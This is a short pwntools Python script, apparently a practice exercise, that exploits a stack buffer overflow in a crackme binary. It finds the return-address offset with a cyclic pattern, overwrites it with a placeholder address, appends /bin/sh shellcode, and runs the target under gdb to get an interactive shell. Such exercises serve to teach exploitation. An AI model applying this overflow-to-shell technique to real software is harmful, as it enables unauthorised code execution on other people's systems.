from pwn import *


context.update(arch='i386', os='linux')

# Show the shellcode and bytes
print(shellcraft.sh())
print(hexdump(asm(shellcraft.sh())))

# Craft the shellcode with /bin/sh
shellcode = shellcraft.sh()

# Search the ret address
payload = cyclic(cyclic_find(0x61616167))
# Move to payload the new ret address
payload += p32(0xdeadbeef)
# Add a shellcode to the payload
payload += asm(shellcode)

# Create process
p = process('./crackme0x00')
# Attach process to gdb with command in the second parameter
gdb.attach(p, '''
echo "hello"
# break *0xdeadbeef
continue
''')
# Send payload to input
p.sendline(payload)
# interactive mode
p.interactive()
